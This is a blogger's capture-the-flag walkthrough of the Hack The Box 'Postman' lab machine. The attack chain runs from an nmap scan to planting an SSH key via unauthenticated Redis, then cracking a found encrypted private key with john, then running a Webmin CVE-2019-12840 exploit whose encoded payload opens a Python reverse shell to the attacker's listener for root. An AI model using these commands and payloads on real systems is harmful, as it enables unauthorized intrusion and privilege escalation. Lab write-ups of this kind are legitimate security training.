# Postman HTB Machine Walk-Through!

So as with all HTB Labs, we’ll start off with our nmap scan see what ports are open and then further enumerate the ports that are..

---

### Postman HTB Machine Walk-Through!

![](https://cdn-images-1.medium.com/max/800/1*r_Vz6L-UxQQ_Uj987M1DRA.png)

So as with all HTB Labs, we’ll start off with our nmap scan see what ports are open and then further enumerate the ports that are..

> Nmap

```
┌──(achilles㉿Nicholas)-[~/HTB/Labs/postman]
└─$ nmap 10.10.10.160 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-05 05:12 EST
Nmap scan report for 10.10.10.160
Host is up (0.039s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 32.91 seconds
```

#### **so we have 22(ssh), 80(http), 6379(redis), 10000(snet-sensor-mgmt).**

```
──(achilles㉿Nicholas)-[~/HTB/Labs/postman]
└─$ nmap -p 22,80,10000 -sV -sC -A -vvv 10.10.10.160
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-05 05:06 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:06
Completed NSE at 05:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:06
Completed NSE at 05:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:06
Completed NSE at 05:06, 0.00s elapsed
Initiating Ping Scan at 05:06
Scanning 10.10.10.160 [4 ports]
Completed Ping Scan at 05:06, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:06
Completed Parallel DNS resolution of 1 host. at 05:06, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 05:06
Scanning 10.10.10.160 [3 ports]
Discovered open port 22/tcp on 10.10.10.160
Discovered open port 80/tcp on 10.10.10.160
Discovered open port 10000/tcp on 10.10.10.160
Completed SYN Stealth Scan at 05:06, 0.08s elapsed (3 total ports)
Initiating Service scan at 05:06
Scanning 3 services on 10.10.10.160
Completed Service scan at 05:06, 6.27s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.160
Initiating Traceroute at 05:06
Completed Traceroute at 05:06, 0.15s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 05:06
Completed Parallel DNS resolution of 2 hosts. at 05:06, 0.10s elapsed
DNS resolution of 2 IPs took 0.10s. Mode: Async [#: 2, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.10.160.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:06
Completed NSE at 05:06, 30.27s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:06
Completed NSE at 05:06, 0.40s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:06
Completed NSE at 05:06, 0.00s elapsed
Nmap scan report for 10.10.10.160
Host is up, received reset ttl 63 (0.055s latency).
Scanned at 2025-11-05 05:06:15 EST for 38s

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDem1MnCQG+yciWyLak5YeSzxh4HxjCgxKVfNc1LN+vE1OecEx+cu0bTD5xdQJmyKEkpZ+AVjhQo/esF09a94eMNKcp+bhK1g3wqzLyr6kwE0wTncuKD2bA9LCKOcM6W5GpHKUywB5A/TMPJ7UXeygHseFUZEa+yAYlhFKTt6QTmkLs64sqCna+D/cvtKaB4O9C+DNv5/W66caIaS/B/lPeqLiRoX1ad/GMacLFzqCwgaYeZ9YBnwIstsDcvK9+kCaUE7g2vdQ7JtnX0+kVlIXRi0WXta+BhWuGFWtOV0NYM9IDRkGjSXA4qOyUOBklwvienPt1x2jBrjV8v3p78Tzz
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIRgCn2sRihplwq7a2XuFsHzC9hW+qA/QsZif9QKAEBiUK6jv/B+UxDiPJiQp3KZ3tX6Arff/FC0NXK27c3EppI=
|   256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF3FKsLVdJ5BN8bLpf80Gw89+4wUslxhI3wYfnS+53Xd
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
|_http-server-header: Apache/2.4.29 (Ubuntu)
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.910 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: MiniServ/1.910
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/5%OT=22%CT=%CU=41957%PV=Y%DS=2%DC=T%G=N%TM=690B21BD
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11
OS:NW7%O6=M552ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 9.986 days (since Sun Oct 26 06:26:51 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   140.69 ms 10.10.14.1
2   140.78 ms 10.10.10.160

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:06
Completed NSE at 05:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:06
Completed NSE at 05:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:06
Completed NSE at 05:06, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.09 seconds
           Raw packets sent: 39 (2.462KB) | Rcvd: 29 (1.902KB)

```

So after a bit of Enumerating port 80 and 10000.. i came across this for redis.. <a href="https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/6379-pentesting-redis" class="markup--anchor markup--p-anchor" data-href="https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/6379-pentesting-redis" rel="noopener" target="_blank">REDIS_POC_LINK</a>.

> Redis_cli

So we’re going to follow the make a key portion of that part of the blog.. I make a directory to keep it organized.. cd into it and create a key.

```
──(achilles㉿Nicholas)-[~/HTB/Labs/postman]
└─$ mkdir keys

 ──(achilles㉿Nicholas)-[~/HTB/Labs/postman]
└─$ cd keys

┌──(achilles㉿Nicholas)-[~/HTB/Labs/postman/keys]
└─$ ssh-keygen -f postman
Generating public/private ed25519 key pair.
Enter passphrase for "postman" (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in postman
Your public key has been saved in postman.pub
The key fingerprint is:
SHA256:YUAP+9SCN2rcHnR3z5m7JKb2E4wvfh96MXpndDwmG74 achilles@Nicholas
The key's randomart image is:
+--[ED25519 256]--+
|     .+          |
|       * .       |
|      o X o . .  |
|     . O = . . oo|
|      + S   o  +o|
|     . . . . = ==|
|        .   ooB==|
|           ooB+o=|
|          oo+E*+.|
+----[SHA256]-----+
```

```
┌──(achilles㉿Nicholas)-[~/HTB/Labs/postman/keys]
└─$ redis-cli -h 10.10.10.160
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> config set dbfilename authorized_keys
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379>
```

Now we change permissions on our key and then sign into this machine with it.. This should work..

```
┌──(achilles㉿Nicholas)-[~/HTB/Labs/postman/keys]
└─$ sudo chmod 600 postman

┌──(achilles㉿Nicholas)-[~/HTB/Labs/postman/keys]
└─$ ssh -i postman redis@10.10.10.160
The authenticity of host '10.10.10.160 (10.10.10.160)' can't be established.
ED25519 key fingerprint is SHA256:eBdalosj8xYLuCyv0MFDgHIabjJ9l3TMv1GYjZdxY9Y.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.160' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$

```

Now we don’t have permission on here to grab the user.txt we have to escalate our privileges.. so i’m going to set up a server and download linpeas.sh from my machine, onto this machine and see what we find.

```
┌──(achilles㉿Nicholas)-[~/HTB/Labs/postman]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.160 - - [05/Nov/2025 17:40:42] "GET /linpeas.sh HTTP/1.1" 200 -
```

```
redis@Postman:~$ cd /dev/shm
redis@Postman:/dev/shm$ wget 10.10.14.4:8000/linpeas.sh
--2025-11-05 22:40:44--  http://10.10.14.4:8000/linpeas.sh
Connecting to 10.10.14.4:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 956174 (934K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 933.76K  1.10MB/s    in 0.8s

2025-11-05 22:40:45 (1.10 MB/s) - ‘linpeas.sh’ saved [956174/956174]

redis@Postman:/dev/shm$ ls
linpeas.sh
redis@Postman:/dev/shm$ bash linpeas.sh

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          LinPEAS-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMagenta: Your username

<SNIP>....

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)

-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou
```

We came across this private key I am guessing prob for matt.. so lets cat that file save it. chmod it and sign in and grab the user.txt flag.

```
──(achilles㉿Nicholas)-[~/HTB/Labs/postman]
└─$ ssh2john id_rsa.bak > hash

┌──(achilles㉿Nicholas)-[~/HTB/Labs/postman]
└─$ john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads per process (8 total across 4 processes)
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa.bak)
2 1g 0:00:00:00 DONE (2025-11-05 21:31) 9.090g/s 561018p/s 561018c/s 561018C/s confused6..coliseum
4 0g 0:00:00:05 DONE (2025-11-05 21:31) 0g/s 640257p/s 640257c/s 640257C/s   ozkelo..*7¡Vamos!
3 0g 0:00:00:05 DONE (2025-11-05 21:31) 0g/s 644858p/s 644858c/s 644858C/s        1234567.a6_123
1 0g 0:00:00:05 DONE (2025-11-05 21:31) 0g/s 637975p/s 637975c/s 637975C/sie168
Waiting for 3 children to terminate
Session completed.
```

```
cat /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

<snip>
-----END RSA PRIVATE KEY-----
redis@Postman:/tmp$ su Matt
Password:
Matt@Postman:/tmp$ cd ..
Matt@Postman:/$ cd home
Matt@Postman:/home$ cd Matt
Matt@Postman:~$ ls
user.txt
Matt@Postman:~$ cat user.txt
ffa239575f364cf053457<snip>
Matt@Postman:~$
```

Now also that we’re in and we have the matts password we can sign into port 10000 using his creds. and poke around.. i came across this <a href="https://github.com/KrE80r/webmin_cve-2019-12840_poc/blob/master/CVE-2019-12840.py?source=post_page-----3045be675d48---------------------------------------" class="markup--anchor markup--p-anchor" data-href="https://github.com/KrE80r/webmin_cve-2019-12840_poc/blob/master/CVE-2019-12840.py?source=post_page-----3045be675d48---------------------------------------" rel="noopener" target="_blank">POC</a> that will get us root and grab that root flag..

```
┌──(achilles㉿Nicholas)-[~/HTB/Labs/postman]
└─$ wget https://raw.githubusercontent.com/KrE80r/webmin_cve-2019-12840_poc/refs/heads/master/CVE-2019-12840.py
--2025-11-06 18:49:44--  https://raw.githubusercontent.com/KrE80r/webmin_cve-2019-12840_poc/refs/heads/master/CVE-2019-12840.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5570 (5.4K) [text/plain]
Saving to: ‘CVE-2019-12840.py’

CVE-2019-12840.py   100%[===================>]   5.44K  --.-KB/s    in 0s

2025-11-06 18:49:44 (13.6 MB/s) - ‘CVE-2019-12840.py’ saved [5570/5570]

┌──(achilles㉿Nicholas)-[~/HTB/Labs/postman]
└─$ chmod +x CVE-2019-12840.py

┌──(achilles㉿Nicholas)-[~/HTB/Labs/postman]
└─$ python3 CVE-2019-12840.py -u https://10.10.10.160 -U Matt -P computer2008 -lhost 10.10.14.4 -lport 9001
/home/achilles/HTB/Labs/postman/CVE-2019-12840.py:26: SyntaxWarning: invalid escape sequence '\ '
  / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \      /_ |__ \ / _ \| || |  / _ \

  _______      ________    ___   ___  __  ___        __ ___   ___  _  _    ___
 / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \      /_ |__ \ / _ \| || |  / _ \
| |     \ \  / /| |__ ______ ) | | | || | (_) |______| |  ) | (_) | || |_| | | |
| |      \ \/ / |  __|______/ /| | | || |\__, |______| | / / > _ <|__   _| | | |
| |____   \  /  | |____    / /_| |_| || |  / /       | |/ /_| (_) |  | | | |_| |
 \_____|   \/   |______|  |____|\___/ |_| /_/        |_|____|\___/   |_|  \___/

                           by KrE80r

             Webmin <= 1.910 RCE (Authorization Required)

usage: python CVE-2019-12840.py -u https://10.10.10.10 -U matt -P Secret123 -c "id"
usage: python CVE-2019-12840.py -u https://10.10.10.10 -U matt -P Secret123 -lhost <LOCAL_IP> -lport 443

[*] logging in ...

[+] got sid a1f1bfd2b389b588ea77b70c8875ffed

[*] sending command python -c "import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjQiLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0p'))"

```

```
┌──(achilles㉿Nicholas)-[~/HTB/Labs/postman]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.160] 50210
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt
ba56dd77fd8d4be398661<snip>
#
```

That will be the end of this box.. hope that helps.. and if not it always helps me haha.. take care.

> Jeremiah 29:11 NIV\\

For I know the plans I have for you,” declares the LORD, “plans to prosper you and not to harm you, plans give you hope and a future.

on just a side note … remember jesus is always seeking a relationship with us.. and is always there for us whether we believe it or not.. seek him and you shall find! Amen.

By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [November 7, 2025](https://medium.com/p/cbed305a5178).

<a href="https://medium.com/@nicholasmullenski/postman-htb-machine-walk-through-cbed305a5178" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 1, 2026.
